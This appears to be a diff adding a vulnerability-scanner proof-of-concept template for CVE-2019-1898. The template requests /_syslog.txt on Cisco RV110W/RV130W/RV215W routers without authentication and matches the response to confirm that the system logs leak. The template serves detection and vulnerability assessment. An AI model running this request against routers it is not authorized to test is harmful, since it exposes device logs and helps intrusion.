@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "Cisco RV110W/RV130W/RV215W路由器存在未授权访问漏洞，攻击者可通过访问/_syslog.txt路径获取系统日志信息"
+id = "POC-AVE-2019-0141"
+name = "CVE-2019-1898 PoC"
+severity = "medium"
+tags = ["ave-2019-0141"]
+vuln_id = [
+    "CVE-2019-1898",
+    "AVE-2019-0141",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/_syslog.txt"
+protocol = "http"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "ethernet",
+    "connection",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+type = "word"
+words = ["application/octet-stream"]
